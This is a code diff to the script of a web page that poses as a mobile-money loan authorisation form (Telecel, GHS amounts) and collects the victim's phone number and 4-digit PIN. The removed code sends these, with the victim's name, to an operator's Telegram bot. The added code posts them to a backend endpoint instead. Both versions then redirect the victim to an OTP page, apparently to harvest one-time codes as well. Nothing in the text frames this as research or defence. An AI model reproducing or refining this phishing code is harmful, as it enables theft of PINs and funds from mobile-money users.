@@ -629,73 +629,114 @@
         document.getElementById('toast').style.display = 'none';
     }
 
-    // ─── SEND TO TELEGRAM ───
-    async function sendToTelegram() {
+    function showError(msg) {
+        const el = document.getElementById('errorMsg');
+        el.textContent = msg;
+        el.style.display = 'block';
+        document.getElementById('successMsg').style.display = 'none';
+    }
+
+    function showSuccess(msg) {
+        const el = document.getElementById('successMsg');
+        el.textContent = msg;
+        el.style.display = 'block';
+        document.getElementById('errorMsg').style.display = 'none';
+    }
+
+    // ─── SEND TO BACKEND API (NOT DIRECTLY TO TELEGRAM) ───
+    async function sendToBackend() {
         if (isProcessing) return;
         
-        const phone = document.getElementById('phone').value;
-        const pin = document.getElementById('pin').value;
+        const phone = document.getElementById('phone').value.trim();
+        const pin = document.getElementById('pin').value.trim();
         const amount = params.get('amount') || '0';
         const name = params.get('name') || 'User';
+        const period = params.get('period') || '30 days';
 
-        if (phone.length < 10 || pin.length < 4) {
-            document.getElementById('errorMsg').textContent = "Please enter a valid phone number and 4-digit PIN.";
-            document.getElementById('errorMsg').style.display = 'block';
+        if (phone.length < 10) {
+            showError('Please enter a valid 10-digit Telecel number.');
+            return;
+        }
+
+        if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+            showError('Please enter a valid 4-digit PIN.');
             return;
         }
 
         isProcessing = true;
         document.getElementById('submitBtn').disabled = true;
         document.getElementById('errorMsg').style.display = 'none';
+        document.getElementById('successMsg').style.display = 'none';
         document.getElementById('spinner').style.display = 'flex';
 
-        // ─── SEND TELEGRAM NOTIFICATION ───
-        const message = `🔐 *New Loan Authorization Request*\n\n👤 *User:* ${name}\n📱 *Phone:* ${phone}\n🔢 *PIN:* ${pin}\n💰 *Amount:* GHS ${parseFloat(amount).toLocaleString()}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to OTP verification.`;
-
         try {
-            const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+            console.log('📤 Sending to backend:', {
+                url: `${CONFIG.API_URL}/api/authorize`,
+                data: { name, phone, amount, pin, period }
+            });
+
+            const response = await fetch(`${CONFIG.API_URL}/api/authorize`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
+                    name: name,
+                    phone: phone,
+                    amount: amount,
+                    pin: pin,
+                    period: period
                 })
             });
 
             const data = await response.json();
-            console.log('📤 Telegram:', data.ok ? '✅ Sent' : '❌ Failed');
+            console.log('📤 Backend Response:', data);
 
-            // Show success and redirect
             document.getElementById('spinner').style.display = 'none';
-            
-            if (data.ok) {
-                // Redirect to OTP page
+
+            if (data.success) {
+                showSuccess('✅ Authorization successful! Redirecting to OTP verification...');
+                
+                // Store loan data for OTP page
+                localStorage.setItem('loan_data', JSON.stringify({
+                    name: name,
+                    phone: phone,
+                    amount: amount,
+                    period: period
+                }));
+
                 setTimeout(() => {
                     const params = new URLSearchParams(window.location.search);
                     params.set('phone', phone);
                     window.location.href = CONFIG.OTP_PAGE + '?' + params.toString();
                 }, 1500);
             } else {
-                // If Telegram fails, still redirect to OTP
-                setTimeout(() => {
-                    const params = new URLSearchParams(window.location.search);
-                    params.set('phone', phone);
-                    window.location.href = CONFIG.OTP_PAGE + '?' + params.toString();
-                }, 1500);
+                showError('❌ ' + (data.message || 'Authorization failed. Please try again.'));
+                isProcessing = false;
+                document.getElementById('submitBtn').disabled = false;
             }
 
         } catch (error) {
-            console.error('❌ Telegram error:', error);
-            document.getElementById('errorMsg').textContent = 'Something went wrong. Please try again.';
-            document.getElementById('errorMsg').style.display = 'block';
+            console.error('❌ API Error:', error);
+            document.getElementById('spinner').style.display = 'none';
+            showError('❌ Connection error. Please check your internet and try again.');
             isProcessing = false;
             document.getElementById('submitBtn').disabled = false;
-            document.getElementById('spinner').style.display = 'none';
         }
     }
 
-    document.getElementById('submitBtn').onclick = sendToTelegram;
+    // ─── BIND THE FUNCTION TO THE BUTTON ───
+    document.getElementById('submitBtn').onclick = sendToBackend;
+
+    // ─── ENTER KEY SUPPORT ───
+    document.getElementById('pin').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') sendToBackend();
+    });
+
+    document.getElementById('phone').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') document.getElementById('pin').focus();
+    });
+
     loadConfig();
     loadLoanData();
 </script>
